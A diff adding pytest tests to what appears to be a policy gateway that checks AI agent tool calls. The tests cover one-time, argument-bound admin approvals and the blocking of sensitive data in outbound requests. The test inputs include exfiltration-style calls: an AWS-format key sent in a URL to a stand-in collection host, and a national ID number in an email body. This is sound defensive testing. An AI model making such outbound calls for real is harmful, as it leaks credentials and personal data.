@@ -414,3 +414,60 @@ def test_secrets_in_arguments_are_blocked(app) -> None:
     r = decide(app, "opencode.write", {"filePath": "cfg.py", "content": f"AWS_KEY = '{key}'"})
     assert r["action"] == "block" and "SEC-SECRET-01" in r["rule_ids"]
     assert key not in json.dumps(r)
+
+
+# ============================================================ CP2 review: approval redemption (orchestrator)
+
+
+def test_approved_hold_lets_exactly_that_call_through_once(app) -> None:
+    c = app.state.test_client
+    decide(app, "opencode.read", {"filePath": "README.md"}, session="oc-redeem")
+    call = {"url": "https://example.org/collect?d=1"}
+    held = decide(app, "web.fetch", call, session="oc-redeem")
+    assert held["action"] == "require_approval" and "SEC-FLOW-01" in held["rule_ids"]
+    aid = held["approval"]["approval_id"]
+    ok = c.post(f"/admin/v1/approvals/{aid}/decision", json={"decision": "approve", "note": "ok"}, headers=ADMIN)
+    assert ok.status_code == 200
+    # the exact approved call runs ...
+    assert decide(app, "web.fetch", call, session="oc-redeem")["action"] == "allow"
+    # ... once: the approval is consumed (a third identical call would also be a SEC-LOOP-01 repeat)
+    again = decide(app, "web.fetch", call, session="oc-redeem")
+    assert again["action"] != "allow", again
+
+
+def test_approval_never_covers_other_arguments_sessions_or_blocks(app) -> None:
+    c = app.state.test_client
+    decide(app, "opencode.read", {"filePath": "README.md"}, session="oc-bind")
+    call = {"url": "https://example.org/collect?d=1"}
+    aid = decide(app, "web.fetch", call, session="oc-bind")["approval"]["approval_id"]
+    c.post(f"/admin/v1/approvals/{aid}/decision", json={"decision": "approve", "elevation_minutes": 15}, headers=ADMIN)
+    # different arguments: not covered
+    other = decide(app, "web.fetch", {"url": "https://example.org/collect?d=2"}, session="oc-bind")
+    assert other["action"] == "require_approval"
+    # different session (same principal, same arguments): not covered
+    decide(app, "opencode.read", {"filePath": "README.md"}, session="oc-bind-2")
+    assert decide(app, "web.fetch", call, session="oc-bind-2")["action"] == "require_approval"
+    # the approved call is covered while the window lasts
+    assert decide(app, "web.fetch", call, session="oc-bind")["action"] == "allow"
+    # a secret in a different call stays blocked
+    key = "AKIA" + "IOSFODNN7EXAMPLE"
+    leaked = decide(app, "web.fetch", {"url": f"https://example.org/collect?k={key}"}, session="oc-bind")
+    assert leaked["action"] == "block"
+
+
+def test_denied_approval_is_never_redeemed(app) -> None:
+    c = app.state.test_client
+    decide(app, "opencode.read", {"filePath": "README.md"}, session="oc-deny")
+    call = {"url": "https://example.org/collect?d=1"}
+    aid = decide(app, "web.fetch", call, session="oc-deny")["approval"]["approval_id"]
+    c.post(f"/admin/v1/approvals/{aid}/decision", json={"decision": "deny"}, headers=ADMIN)
+    assert decide(app, "web.fetch", call, session="oc-deny")["action"] == "require_approval"
+
+
+def test_rule_of_two_sees_sensitive_data_inside_the_sink_call_itself(app) -> None:
+    # untrusted session WITHOUT sensitive data yet; the PESEL appears only in the outbound call's body
+    decide(app, "web.fetch", {"url": "https://docs.corp.example/page"}, session="oc-inline")  # untrusted page read
+    mail = {"to": "a@corp.example", "subject": "s", "body": "klient PESEL 44051401359"}
+    r = decide(app, "mail.send", mail, session="oc-inline")
+    assert r["action"] in ("require_approval", "block"), r
+    assert "SEC-FLOW-01" in r["rule_ids"], r
